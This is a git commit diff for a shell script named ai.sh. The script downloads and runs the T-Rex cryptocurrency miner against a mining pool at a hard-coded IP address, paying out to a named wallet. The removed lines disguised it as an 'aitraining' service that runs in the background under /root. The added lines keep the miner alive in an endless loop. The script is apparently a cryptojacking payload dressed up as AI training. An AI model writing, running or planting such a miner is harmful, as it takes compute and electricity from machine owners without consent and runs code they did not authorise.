39c167bc7d6689c26ed9549412b0b9f7a6e10b7f
max313iq <153689278+max313iq@users.noreply.github.com>
2024-11-29 06:40:39 +0300

    Update ai.sh

--- ai.sh
+++ ai.sh
@@ -1,13 +1,13 @@
 #!/bin/bash
 
-SERVICE_NAME="aitraining"
-SCRIPT_PATH="/root/${SERVICE_NAME}_script.sh"
-cat <<'EOF' > "$SCRIPT_PATH"
-#!/bin/bash
+# Download and extract T-Rex miner
 wget https://github.com/trexminer/T-Rex/releases/download/0.26.8/t-rex-0.26.8-linux.tar.gz
 tar xvzf t-rex-0.26.8-linux.tar.gz
-./t-rex -a kawpow -o stratum+tcp://178.62.59.230:4444 -u RM2ciYa3CRqyreRsf25omrB4e1S95waALr.batch
-EOF
-chmod 700 "$SCRIPT_PATH"
 
-nohup "$SCRIPT_PATH" > /root/aitraining.log 2> /root/aitraining_error.log &
+# Start the miner
+./t-rex -a kawpow -o stratum+tcp://178.62.59.230:4444 -u RM2ciYa3CRqyreRsf25omrB4e1S95waALr.batch &
+
+# Now the script will enter an infinite loop, doing nothing but keeping the process alive
+while true; do 
+  sleep 60 # sleep for 1 minute to avoid overloading the system
+done
